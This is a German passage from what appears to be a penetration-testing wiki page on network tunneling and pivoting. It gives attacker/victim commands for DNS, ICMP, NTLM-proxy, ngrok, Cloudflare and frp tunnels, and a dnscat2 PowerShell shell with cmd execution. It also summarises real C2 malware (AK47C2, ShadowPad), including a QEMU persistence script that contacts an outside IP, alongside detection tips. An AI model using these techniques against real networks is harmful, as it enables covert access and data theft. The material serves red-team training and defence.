[`rdp2tcp`](../network-services-pentesting/pentesting-rdp.md#rdp-virtual-channel-tunneling) ist ein weiterer RDP-Virtual-Channel-Tunnel. Sein Standardkanalname lautet `rdp2tcp`, aber ein Operator kann einen anderen Namen festlegen.<sup>[[56]](#references)</sup> Die Erstellung und Schließung von Kanälen werden in `Microsoft-Windows-RemoteDesktopServices-RdpCoreTS/Operational` mit den Ereignis-IDs **132** und **148** protokolliert. Suche nach `rdp2tcp` und seltenen oder zufälligen Kanalnamen und vergleiche sie anschließend mit erwarteten Kanälen wie `XPSRD`, `cliprdr` und `Microsoft::Windows::RDS::DisplayControl`.<sup>[[58]](#references)</sup>

## Windows-GUI-Apps über einen Proxy leiten

Mit [**Proxifier**](https://www.proxifier.com/) kannst du Windows-GUI-Apps über einen Proxy leiten.<sup>[[26]](#references)</sup>\
Füge unter **Profile -> Proxy Servers** die IP-Adresse und den Port des SOCKS-Servers hinzu.\
Füge unter **Profile -> Proxification Rules** den Namen des Programms, das du über einen Proxy leiten möchtest, sowie die Verbindungen zu den gewünschten IP-Adressen hinzu. Proxifier-Regeln können Anwendungen, Zielhosts und Ports berücksichtigen.<sup>[[27]](#references)</sup>

## Tunnel durch einen NTLM-Proxy

Das zuvor erwähnte Tool **Rpivot** kann die Verbindung über einen NTLM-authentifizierenden Proxy weiterleiten. Auch **OpenVPN** kann so konfiguriert werden, dass es über einen solchen Proxy kommuniziert, wenn eine Authentifizierungsdatei und die NTLMv2-Methode verwendet werden. Dabei handelt es sich um eine Proxy-Umgehung, nicht um eine Umgehung der Proxy-Authentifizierung.<sup>[[20]](#references)[[28]](#references)</sup>

```bash
http-proxy <proxy_ip> 8080 <file_with_creds> ntlm2
```

### Cntlm

[http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)

Cntlm authentifiziert sich bei vorgelagerten NTLM-Proxys, stellt lokale Listener bereit und kann einen lokalen Tunnelport einem Zieldienst zuordnen; Clients können dann diesen lokalen Port verwenden.<sup>[[29]](#references)</sup>\
Zum Beispiel diesen Port 443 weiterleiten.

```
Username Alice
Password P@ssw0rd
Domain CONTOSO.COM
Proxy 10.0.0.10:8080
Tunnel 2222:<attackers_machine>:443
```

Wenn du beispielsweise den **SSH**-Dienst auf dem Opfer so einstellst, dass er auf Port 443 lauscht, kannst du dich über den Angreifer-Port 2222 damit verbinden.<sup>[[29]](#references)</sup>\
Du könntest auch einen **meterpreter** verwenden, der sich mit localhost:443 verbindet, während der Angreifer auf Port 2222 lauscht.<sup>[[29]](#references)</sup>

## YARP

YARP (Yet Another Reverse Proxy) ist Microsofts .NET-Toolkit für Reverse-Proxys. Du findest es hier: [https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy).<sup>[[30]](#references)</sup>

## DNS Tunneling

### Iodine

[https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)

Iodine erstellt einen IPv4-Tunnel durch DNS-Abfragen und verwendet TUN-Schnittstellen. Die dokumentierte Einrichtung erfordert auf beiden Seiten die nötigen Berechtigungen zum Erstellen dieser Schnittstellen.<sup>[[31]](#references)</sup>

```
attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
victim> iodine -f -P P@ssw0rd tunneldomain.com -r
#You can see the victim at 1.1.1.2
```

Der DNS-Transport hat einen höheren Overhead als direktes TCP und ist typischerweise langsam; du kannst über diesen Tunnel eine komprimierte SSH-Verbindung erstellen, indem du Folgendes verwendest:<sup>[[31]](#references)</sup>

```
ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
```

### DNSCat2

[**Hier herunterladen**](https://github.com/iagox86/dnscat2)**.**

Dnscat2 richtet über DNS einen verschlüsselten Command-and-Control-Kanal ein; die unten aufgeführten Server- und Client-Befehle entsprechen der dokumentierten Verwendung.<sup>[[32]](#references)</sup>

```bash
attacker> ruby ./dnscat2.rb tunneldomain.com
victim> ./dnscat2 tunneldomain.com

# If using it in an internal network for a CTF:
attacker> ruby dnscat2.rb --dns host=10.10.10.10,port=53,domain=mydomain.local --no-cache
victim> ./dnscat2 --dns host=10.10.10.10,port=5353
```

#### **In PowerShell**

Mit [**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershell) kannst du einen dnscat2-Client in PowerShell ausführen; in der README sind die unten gezeigten `Start-Dnscat2`-Parameter dokumentiert.<sup>[[33]](#references)</sup>

```
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret somesecret -Exec cmd
```

#### **Port forwarding mit dnscat**

Der interaktive `listen`-Befehl von Dnscat2 ordnet einen lokalen Listener einem Remote-Host und -Port zu.<sup>[[32]](#references)</sup>

```bash
session -i <sessions_id>
listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this bind 8080port in attacker host
```

#### Proxychains-DNS ändern

Proxychains-ng hookt sich in dynamisch gelinkte TCP-Verbindungen ein und kann weder UDP noch ICMP übertragen. DNS-Proxying ist konfigurierbar. Prüfe daher die installierte `proxychains.conf` und das Resolver-Hilfsprogramm, statt von einem festen öffentlichen Resolver auszugehen. Ältere `proxyresolv`-Skripte stellen `PROXY_DNS_SERVER` zur Auswahl des Resolvers bereit. Wenn interne Namen benötigt werden, verwende einen Resolver, der vom Pivot aus erreichbar ist.<sup>[[34]](#references)[[35]](#references)</sup>

## Tunnels in Go

[https://github.com/hotnops/gtunnel](https://github.com/hotnops/gtunnel)

### Benutzerdefiniertes DNS-TXT-/HTTP-JSON-C2 (AK47C2)

Der Akteur Storm-2603 entwickelte ein **Dual-Channel-C2 („AK47C2“)**, das ausschließlich ausgehenden **DNS**- und **unverschlüsselten HTTP-POST**-Traffic missbraucht – zwei Protokolle, die in Unternehmensnetzwerken selten blockiert werden.<sup>[[2]](#references)</sup>

1. **DNS-Modus (AK47DNS)**
   • Erzeugt eine zufällige, 5 Zeichen lange SessionID (z. B. `H4T14`).  
   • Stellt *Task-Anfragen* eine `1` oder *Ergebnissen* eine `2` voran und verkettet verschiedene Felder (Flags, SessionID, Computername).  
   • Jedes Feld wird **mit dem ASCII-Schlüssel `VHBD@H` XOR-verschlüsselt**, hexadezimal kodiert und durch Punkte verbunden – zum Schluss wird die angreifergesteuerte Domain angehängt:

   ```text
   <1|2><SessionID>.a<SessionID>.<Computer>.update.updatemicfosoft.com
   ```

   • Anfragen verwenden `DnsQuery()` für **TXT**- (und als Fallback **MG**-)Records.  
   • Wenn die Antwort 0xFF Bytes überschreitet, **fragmentiert** die Backdoor die Daten in 63-Byte-Blöcke und fügt die Marker ein:
     `s<SessionID>t<TOTAL>p<POS>`, damit der C2-Server sie neu anordnen kann.

2. **HTTP mode (AK47HTTP)**
   • Erstellt einen JSON-Umschlag:
   ```json
   {"cmd":"","cmd_id":"","fqdn":"<host>","result":"","type":"task"}
   ```
   • Der gesamte Blob wird mit XOR-`VHBD@H` verknüpft, in Hexadezimalform umgewandelt und als Body eines **`POST /`** mit dem Header `Content-Type: text/plain` gesendet.
   • Die Antwort verwendet dieselbe Codierung, und das Feld `cmd` wird mit `cmd.exe /c <command> 2>&1` ausgeführt.

Blue Team-Notizen
• Achten Sie auf ungewöhnliche **TXT-Abfragen**, deren erstes Label aus einer langen Hexadezimalfolge besteht und die immer mit einer seltenen Domain enden.  
• Ein konstanter XOR-Schlüssel gefolgt von ASCII-Hexadezimaldaten lässt sich mit YARA leicht erkennen: `6?56484244?484` (`VHBD@H` in Hexadezimalform).  
• Bei HTTP sollten Sie POST-Bodies mit dem Content-Type text/plain kennzeichnen, die ausschließlich aus Hexadezimaldaten bestehen und eine gerade Anzahl von Bytes haben.

{{#note}}
Der Channel hält jedes Subdomain-Label innerhalb des DNS-Limits von 63 Oktetten. Die Einhaltung des Protokolls allein macht ihn jedoch nicht unauffällig; seltene Domains, lange Hexadezimal-Labels und das Abfragevolumen bleiben Erkennungssignale.<sup>[[2]](#references)[[36]](#references)</sup>
{{#endnote}}

## ICMP Tunneling

### Hans

[https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
[https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)

Hans dokumentiert einen IPv4-over-ICMP-Tunnel, der ein TUN-Gerät und ICMP-Echo-Requests verwendet; für die Einrichtung sind ausreichende Berechtigungen zum Erstellen der Schnittstelle erforderlich.<sup>[[37]](#references)</sup>

```bash
./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
./hans -f -c <server_ip> -p P@ssw0rd -v
ping 1.1.1.100 #After a successful connection, the victim will be in the 1.1.1.100
```

### ptunnel-ng

[**Hier herunterladen**](https://github.com/utoni/ptunnel-ng.git).

ptunnel-ng überträgt TCP-Verbindungen über ICMP und verwendet die unten gezeigten Optionen `-p`, `-l`, `-r` und `-R` für Proxy, lokalen Listener, Zielhost und Zielport.<sup>[[38]](#references)</sup>

```bash
# Generate it
sudo ./autogen.sh

# Server -- victim (needs to be able to receive ICMP)
sudo ptunnel-ng
# Client - Attacker
sudo ptunnel-ng -p <server_ip> -l <listen_port> -r <dest_ip> -R <dest_port>
# Try to connect with SSH through ICMP tunnel
ssh -p 2222 -l user 127.0.0.1
# Create a socks proxy through the SSH connection through the ICMP tunnel
ssh -D 9050 -p 2222 -l user 127.0.0.1
```

## ngrok

[**ngrok**](https://ngrok.com/) ist ein Agent, mit dem lokale Netzwerkdienste über einen sicheren Tunnel online verfügbar gemacht werden können. Die CLI dokumentiert HTTP-, TCP- und File-URL-Endpunkte. Der ausgegebene Hostname des Endpunkts kann je nach Endpunkt und Konto variieren.<sup>[[39]](#references)</sup>

### Installation

- Konto erstellen: https://ngrok.com/signup
- Client herunterladen:

```bash
tar xvzf ~/Downloads/ngrok-v3-stable-linux-amd64.tgz -C /usr/local/bin
chmod a+x ./ngrok
# Init configuration, with your token
./ngrok config edit
```

### Grundlegende Verwendung

**Dokumentation:** [https://ngrok.com/docs/getting-started/](https://ngrok.com/docs/getting-started/).

_Der Agent unterstützt bei Bedarf auch Authentifizierungs- und TLS-Optionen.<sup>[[39]](#references)</sup>_

#### TCP-Tunneling

```bash
# Pointing to 0.0.0.0:4444
./ngrok tcp 4444
# Example of resulting link: 0.tcp.ngrok.io:12345
# Listen (example): nc -nvlp 4444
# Remote connect (example): nc $(dig +short 0.tcp.ngrok.io) 12345
```

#### Dateien über HTTP bereitstellen

```bash
./ngrok http file:///tmp/httpbin/
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
```

#### Sniffing von HTTP-Aufrufen

_Nützlich für XSS,SSRF,SSTI ..._\
Der eigenständige Agent stellt seine HTTP-Inspektionsoberfläche standardmäßig unter `http://127.0.0.1:4040` bereit; die Oberfläche ist für HTTP-Traffic gedacht.<sup>[[40]](#references)</sup>

#### Tunneling eines internen HTTP-Dienstes

Die Option `--host-header=rewrite` schreibt den HTTP-`Host`-Header der Upstream-Anfrage um, sodass er dem lokalen Dienst entspricht.<sup>[[41]](#references)</sup>

```bash
./ngrok http localhost:8080 --host-header=rewrite
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
# With basic auth
./ngrok http localhost:8080 --host-header=rewrite --auth="myuser:mysuperpassword"
```

#### Einfaches Konfigurationsbeispiel für ngrok.yaml

Dies verwendet ngrok Agent Config v2; benannte Tunnel verwenden `proto` und `addr` und werden mit `ngrok start` gestartet.<sup>[[42]](#references)</sup> Es öffnet 3 Tunnel:

- 2 TCP
- 1 HTTP-Tunnel, der statische Dateien aus /tmp/httpbin/ bereitstellt

```yaml
version: 2
tunnels:
  mytcp:
    addr: 4444
    proto: tcp
  anothertcp:
    addr: 5555
    proto: tcp
  httpstatic:
    proto: http
    addr: file:///tmp/httpbin/
```

## Microsoft Dev Tunnels

Microsoft Dev Tunnels können einen lokalen TCP-basierten Dienst über die Relay-Infrastruktur von Microsoft veröffentlichen. Die Host-CLI erstellt einen ausgehenden Tunnel, während `devtunnel connect` den gehosteten Port auf dem Client wiederherstellt; standardmäßig erfordern Tunnel eine Authentifizierung, sofern die Zugriffskontrollen nicht bewusst gelockert werden.<sup>[[55]](#references)[[58]](#references)</sup>

```bash
# Compromised/pivot host: publish its local RDP service
# Save the tunnel ID printed by this command
devtunnel host -p 3389

# Operator host: authenticate as an authorized tunnel user and create
# a local 127.0.0.1:3389 forward to the hosted port
devtunnel connect <TUNNEL_ID>
xfreerdp /u:<USER> /v:127.0.0.1:3389
```

Dies kann RDP über `*.devtunnels.ms` zugänglich machen, ohne am Perimeter einen neuen eingehenden Listener zu öffnen. Es lässt sich außerdem mit einem RDP-Virtual-Channel-Tunnel wie `rdp2tcp` kombinieren, sodass die RDP-Sitzung als Pivot der zweiten Stufe für beliebigen TCP-Datenverkehr dient.<sup>[[58]](#references)</sup>

Bei der Suche sollten die Ausführung der Dev Tunnels CLI mit DNS-/TLS-Datenverkehr zu `*.devtunnels.ms` und unerwarteten RDP-Virtual-Channel-Ereignissen korreliert werden. Ein authentifizierter Tunnel ist nicht allein deshalb unbedenklich, weil er ein Microsoft-eigenes Relay verwendet.<sup>[[58]](#references)</sup>

## Cloudflared (Cloudflare Tunnel)

Der `cloudflared`-Connector von Cloudflare Tunnel baut ausgehende Verbindungen auf; veröffentlichte Anwendungen können HTTP, HTTPS, TCP, SSH und RDP weiterleiten, während Quick Tunnels für die HTTP-Entwicklung vorgesehen sind.<sup>[[43]](#references)[[45]](#references)</sup>

### Quick-Tunnel-Einzeiler

```bash
# Expose a local web service listening on 8080
cloudflared tunnel --url http://localhost:8080
# => Generates https://<random>.trycloudflare.com that forwards to 127.0.0.1:8080
```

### SOCKS5-Ursprung (Legacy-Modus)

Das Legacy-Flag `--socks5` weist `cloudflared` an, dass der lokale Origin SOCKS5 spricht; es erstellt keinen lokalen SOCKS5-Listener. Bei einem Managed Tunnel konfiguriert `originRequest.proxyType: socks` die SOCKS5-Origin-Verarbeitung.<sup>[[44]](#references)</sup>

```bash
# Expose a local SOCKS5-speaking origin (legacy syntax)
cloudflared tunnel --url socks5://localhost:1080 --socks5
```

### Persistente Tunnel mit DNS

Eine lokal verwaltete Tunnelkonfiguration verwendet die kleingeschriebenen Schlüssel `tunnel`, `credentials-file` und `url`, wie unten gezeigt.<sup>[[46]](#references)</sup>

```bash
cloudflared tunnel create mytunnel
cloudflared tunnel route dns mytunnel internal.example.com
# config.yml
tunnel: <TUNNEL-UUID>
credentials-file: /root/.cloudflared/<TUNNEL-UUID>.json
url: http://127.0.0.1:8000
```

Connector starten:

```bash
cloudflared tunnel run mytunnel
```

Der Connector stellt ausgehende Verbindungen her und handelt standardmäßig QUIC mit Fallback auf HTTP/2 aus. Gehe nicht davon aus, dass jede Bereitstellung TCP/443 verwendet. Führe ihn nur mit den für deine Bereitstellung erforderlichen Berechtigungen aus.<sup>[[43]](#references)[[47]](#references)</sup>

## FRP (Fast Reverse Proxy)

[`frp`](https://github.com/fatedier/frp) ist ein in Go implementierter Reverse Proxy, der **TCP, UDP, HTTP/S, STCP/SUDP, TCPMUX und XTCP** unterstützt. XTCP verwendet P2P Hole Punching, dessen Erfolg von NAT abhängt. Seit **v0.53.0** kann frp als **SSH Tunnel Gateway** fungieren, sodass ein Zielhost den standardmäßigen OpenSSH-Client ohne `frpc`-Binary verwenden kann.<sup>[[48]](#references)[[49]](#references)[[50]](#references)</sup>

### Klassischer umgekehrter TCP-Tunnel

```bash
# Attacker / server
./frps -c frps.toml            # listens on 0.0.0.0:7000

# Victim
./frpc -c frpc.toml            # will expose 127.0.0.1:3389 on frps:5000

# frpc.toml
serverAddr = "attacker_ip"
serverPort = 7000

[[proxies]]
name       = "rdp"
type       = "tcp"
localIP    = "127.0.0.1"
localPort  = 3389
remotePort = 5000
```

### Verwendung des neuen SSH-Gateways (ohne frpc-Binary)

```bash
# On frps (attacker)
sshTunnelGateway.bindPort = 2200   # add to frps.toml
./frps -c frps.toml

# On victim (OpenSSH client only)
ssh -R :80:127.0.0.1:8080 v0@attacker_ip -p 2200 tcp --proxy_name web --remote_port 9000
```

Der obige Befehl veröffentlicht den Port **8080** des Opfers als **attacker_ip:9000** über den standardmäßigen OpenSSH-Client, während `frps` als Gateway dient.<sup>[[50]](#references)</sup>

## Covert VM-based Tunnels mit QEMU

QEMU user-mode networking erfordert für das virtuelle Netzwerk weder Root- noch Administratorrechte, und `-netdev user,hostfwd=...` leitet TCP-, UDP- oder UNIX-Verbindungen vom Host an den Gast weiter.<sup>[[51]](#references)</sup> TrustedSec dokumentierte eine Tiny-Core-QEMU-VM und einen Versuch mit einem reverse SSH tunnel bei einem Vorfall, bei dem hostorientiertes EDR Aktivitäten innerhalb des Gasts möglicherweise übersehen könnte.<sup>[[1]](#references)</sup>

### Schneller Einzeiler

```powershell
# Windows victim (user-mode networking; no TAP driver is needed for this example)
qemu-system-x86_64.exe ^
   -m 256M ^
   -drive file=tc.qcow2,if=ide ^
   -netdev user,id=n0,hostfwd=tcp::2222-:22 ^
   -device e1000,netdev=n0 ^
   -nographic
```

• Der obige Befehl startet einen **Tiny Core Linux**-Gast mit 256 MiB Gastspeicher und einem qcow2-Disk-Image; das Disk-Image ist kein RAM-Disk-Image.
• Port **2222/tcp** auf dem Windows-Host wird transparent an **22/tcp** innerhalb des Gasts weitergeleitet.  
• Aus Sicht des Angreifers stellt das Ziel einfach Port 2222 bereit; alle dort ankommenden Pakete werden vom SSH-Server in der VM verarbeitet.

### Unauffälliger Start über VBScript

TrustedSec beobachtete im oben zitierten Vorfall VBS-gesteuerte QEMU-Starts und Tiny-Core-Images.<sup>[[1]](#references)</sup>

```vb
' update.vbs – lived in C:\ProgramData\update
Set o = CreateObject("Wscript.Shell")
o.Run "stl.exe -m 256M -drive file=tc.qcow2,if=ide -netdev user,id=n0,hostfwd=tcp::2222-:22", 0
```

Das Ausführen des Skripts mit `cscript.exe //B update.vbs` hält das Fenster verborgen.<sup>[[1]](#references)</sup>

### Persistence im Gast-System

Der zitierte Vorfall beschreibt Persistence im zustandslosen Tiny-Core-Gast über `/opt/bootlocal.sh` und `/opt/filetool.lst`:<sup>[[1]](#references)</sup>

1. Payload nach `/opt/123.out` schreiben  
2. An `/opt/bootlocal.sh` anhängen:

   ```sh
   while ! ping -c1 45.77.4.101; do sleep 2; done
   /opt/123.out
   ```

3. Füge `home/tc` und `opt` zu `/opt/filetool.lst` hinzu, damit das Payload beim Herunterfahren in `mydata.tgz` gepackt wird.

### Telemetrie-Aspekte

• Der Host macht weiterhin den QEMU-Prozess, das qcow2-Image und jeden vom Host weitergeleiteten Listener sichtbar.  
• Hostseitige Prozess-Scans untersuchen möglicherweise keine Guest-Prozesse, aber Virtualisierung garantiert keine Umgehung; Netzwerk-, QEMU- und Image-Telemetrie kann sie weiterhin aufdecken.<sup>[[1]](#references)[[51]](#references)</sup>

### Tipps für Defender

• Erstelle Alerts für **unerwartete QEMU/VirtualBox/KVM-Binaries** in benutzerschreibbaren Pfaden.  
• Blockiere ausgehende Verbindungen, die von `qemu-system*.exe` ausgehen.  
• Suche nach ungewöhnlichen Ports (2222, 10022, …), die unmittelbar nach dem Start von QEMU gebunden werden.

## IIS/HTTP.sys-Relay-Knoten via `HttpAddUrl` (ShadowPad)

Check Point beschreibt das IIS-Modul von ShadowPad als Mittel, kompromittierte Webserver am Perimeter in Backdoor- und Relay-Knoten zu verwandeln, indem URL-Präfixe über `HttpAddUrl` gebunden werden.<sup>[[3]](#references)</sup>

Derselbe Bericht beschreibt die unten zusammengefassten Standardwerte, Wildcard-Listener, Paketentschlüsselung, Relay-Warteschlangen und Debug-Telemetrie.<sup>[[3]](#references)</sup>

* **Config-Standardwerte** – Wenn in der JSON-Config des Moduls Werte fehlen, werden plausible IIS-Standardwerte verwendet (`Server: Microsoft-IIS/10.0`, `DocumentRoot: C:\inetpub\wwwroot`, `ErrorPage: C:\inetpub\custerr\en-US\404.htm`). So beantwortet IIS harmlosen Traffic mit dem korrekten Branding.
* **Wildcard-Interception** – Operatoren geben eine durch Semikolons getrennte Liste von URL-Präfixen an (Wildcards in Host und Pfad). Das Modul ruft für jeden Eintrag `HttpAddUrl` auf, sodass HTTP.sys passende Requests an den bösartigen Handler weiterleitet; nicht passende Requests fallen auf das normale IIS-Verhalten zurück.
* **Verschlüsseltes erstes Paket** – Die ersten beiden Bytes des Request-Bodys enthalten den Seed für einen benutzerdefinierten 32-Bit-PRNG. Jedes folgende Byte wird vor dem Parsen des Protokolls mit dem generierten Keystream XOR-verknüpft:

  ```python
  def decrypt_first_packet(buf):
      seed = buf[0] | (buf[1] << 8)
      num = seed & 0xFFFFFFFF
      out = bytearray(buf)
      for i in range(2, len(out)):
          hi = (num >> 16) & 0xFFFF
          num = (hi * 0x7093915D - num * 0x6EA30000 + 0x06B0F0E3) & 0xFFFFFFFF
          out[i] ^= num & 0xFF
      return out
  ```

* **Relay-Orchestrierung** – Das Modul verwaltet zwei Listen: „servers“ (Upstream-Knoten) und „clients“ (nachgelagerte Implantate). Einträge werden entfernt, wenn innerhalb von etwa 30 Sekunden kein Heartbeat eingeht. Sind beide Listen nicht leer, verbindet es den ersten gesunden Server mit dem ersten gesunden Client und leitet einfach Bytes zwischen ihren Sockets weiter, bis eine Seite die Verbindung schließt.
* **Debug-Telemetrie** – Bei aktivierter Protokollierung werden für jede Verbindung die Quell-IP, die Ziel-IP und die insgesamt weitergeleiteten Bytes erfasst. Ermittler nutzten diese Spuren, um das ShadowPad-Netzwerk über mehrere Opfer hinweg nachzubilden.

---

## Weitere Tools zum Prüfen

- [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
- [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)

## References

- [1] [Versteckt in den Schatten: Verdeckte Tunnel mittels QEMU-Virtualisierung](https://trustedsec.com/blog/hiding-in-the-shadows-covert-tunnels-via-qemu-virtualization)
- [2] [Check Point Research – Vor ToolShell: Einblicke in die früheren Ransomware-Operationen von Storm-2603](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [3] [Check Point Research – Im Inneren von Ink Dragon: Das Relay-Netzwerk und die Abläufe einer verdeckten offensiven Operation enthüllt](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [4] [Evil-WinRM-README](https://raw.githubusercontent.com/Hackplayers/evil-winrm/master/README.md)
- [5] [Nmap-Referenzhandbuch: Firewall-/IDS-Beschränkungen umgehen](https://nmap.org/book/man-bypass-firewalls-ids.html)
- [6] [OpenBSD-ssh-Handbuch](https://man.openbsd.org/ssh)
- [7] [OpenBSD-sshd_config-Handbuch](https://man.openbsd.org/sshd_config)
- [8] [OpenSSH 9.6 – Versionshinweise](https://www.openssh.org/txt/release-9.6)
- [9] [sshuttle-README](https://raw.githubusercontent.com/sshuttle/sshuttle/master/README.rst)
- [10] [Metasploit: Pivoting in Metasploit](https://docs.metasploit.com/docs/using-metasploit/intermediate/pivoting-in-metasploit.html)
- [11] [Dokumentation des Metasploit-socks_proxy-Moduls](https://raw.githubusercontent.com/rapid7/metasploit-framework/master/documentation/modules/auxiliary/server/socks_proxy.md)
- [12] [Dokumentation des Metasploit-autoroute-Moduls](https://raw.githubusercontent.com/rapid7/metasploit-framework/master/documentation/modules/post/multi/manage/autoroute.md)
- [13] [Cobalt Strike: SOCKS-Proxy](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/pivoting_socks-proxy.htm)
- [14] [Cobalt Strike: Reverse-Port-Forward](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/pivoting_reverse-port-forward.htm)
- [15] [reGeorg-README](https://raw.githubusercontent.com/sensepost/reGeorg/master/README.md)
- [16] [Chisel-README](https://raw.githubusercontent.com/jpillora/chisel/master/README.md)
- [17] [Ligolo-ng-Schnellstart](https://docs.ligolo.ng/Quickstart/)
- [18] [Ligolo-ng-Listener](https://docs.ligolo.ng/Listeners/)
- [19] [Ligolo-ng-Localhost](https://docs.ligolo.ng/Localhost/)
- [20] [rpivot-README](https://raw.githubusercontent.com/klsecservices/rpivot/master/README.md)
- [21] [socat-Handbuch](https://man7.org/linux/man-pages/man1/socat.1.html)
- [22] [PuTTY-Plink-Handbuch](https://the.earth.li/~sgtatham/putty/0.84/htmldoc/Chapter7.html)
- [23] [PuTTY-Kommandozeilenoptionen](https://the.earth.li/~sgtatham/putty/0.84/htmldoc/Chapter3.html)
- [24] [Microsoft-netsh-Befehl interface portproxy](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-interface)
- [25] [SocksOverRDP-README](https://raw.githubusercontent.com/nccgroup/SocksOverRDP/master/README.md)
- [26] [Proxifier-Dokumentation](https://www.proxifier.com/docs/win-v4/)
- [27] [Proxifier-Proxifizierungsregeln](https://www.proxifier.com/docs/win-v3/rules.htm)
- [28] [OpenVPN-2.7-Handbuch](https://openvpn.net/community-docs/community-articles/openvpn-2-7-manual.html)
- [29] [Cntlm](https://cntlm.sourceforge.net/)
- [30] [YARP-README](https://raw.githubusercontent.com/dotnet/yarp/main/README.md)
- [31] [iodine-README](https://code.kryo.se/iodine/README.html)
- [32] [dnscat2-README](https://raw.githubusercontent.com/iagox86/dnscat2/master/README.md)
- [33] [dnscat2-powershell-README](https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/master/README.md)
- [34] [proxychains-ng-README](https://raw.githubusercontent.com/rofl0r/proxychains-ng/master/README)
- [35] [proxyresolv](https://github.com/haad/proxychains/blob/master/src/proxyresolv)
- [36] [RFC 1035: Domainnamen – Implementierung und Spezifikation](https://www.rfc-editor.org/rfc/rfc1035)
- [37] [Hans](https://code.gerade.org/hans/)
- [38] [ptunnel-ng-README](https://raw.githubusercontent.com/utoni/ptunnel-ng/master/README.md)
- [39] [ngrok-Agent-CLI](https://ngrok.com/docs/agent/cli)
- [40] [ngrok-Web-Inspektionsoberfläche](https://ngrok.com/docs/agent/web-inspection-interface)
- [41] [ngrok-virtuelle Hosts](https://ngrok.com/docs/using-ngrok-with/virtualHosts)
- [42] [ngrok-Agent-Konfiguration v2](https://ngrok.com/docs/agent/config/v2)
- [43] [Cloudflare-Tunnel-Übersicht](https://developers.cloudflare.com/tunnel/)
- [44] [Cloudflare-Tunnel-Ursprungsparameter](https://developers.cloudflare.com/tunnel/advanced/origin-parameters/)
- [45] [Cloudflare-Tunnel-Einrichtung](https://developers.cloudflare.com/tunnel/setup/)
- [46] [Cloudflare-Tunnel-Konfigurationsdatei](https://developers.cloudflare.com/cloudflare-one/networks/connectors/cloudflare-tunnel/do-more-with-tunnels/local-management/configuration-file/)
- [47] [Cloudflare-Tunnel-Ausführungsparameter](https://developers.cloudflare.com/tunnel/advanced/run-parameters/)
- [48] [frp-Konzepte](https://gofrp.org/en/docs/concepts/)
- [49] [frp XTCP](https://gofrp.org/en/docs/features/xtcp/)
- [50] [frp-SSH-Tunnel-Gateway](https://gofrp.org/en/docs/features/common/ssh/)
- [51] [QEMU-Netzwerkdokumentation](https://www.qemu.org/docs/master/system/devices/net.html)
- [52] [wstunnel-README](https://github.com/erebe/wstunnel/blob/main/README.md)
- [53] [NetSPI-BOFScale-Quellcode-Repository](https://github.com/NetSPI/BOFscale)
- [54] [BOFScale: Ein CDN-gestütztes Tailnet über ein BOF-PE](https://www.netspi.com/blog/technical-blog/red-teaming/bofscale-a-cdn-fronted-tailnet-from-a-bof-pe/)
- [55] [Microsoft Learn – Dev-Tunnels-CLI-Befehle](https://learn.microsoft.com/en-us/azure/developer/dev-tunnels/cli-commands)
- [56] [V-E-O/rdp2tcp](https://github.com/V-E-O/rdp2tcp)
- [57] [Fortra Impacket – atexec.py](https://github.com/fortra/impacket/blob/master/examples/atexec.py)
- [58] [NightEagle APT: GhostContainer und Tunneling](https://securelist.com/tr/nighteagle-apt-ghostcontainer-and-tunneling/121323/)
{{#include ../banners/hacktricks-training.md}}
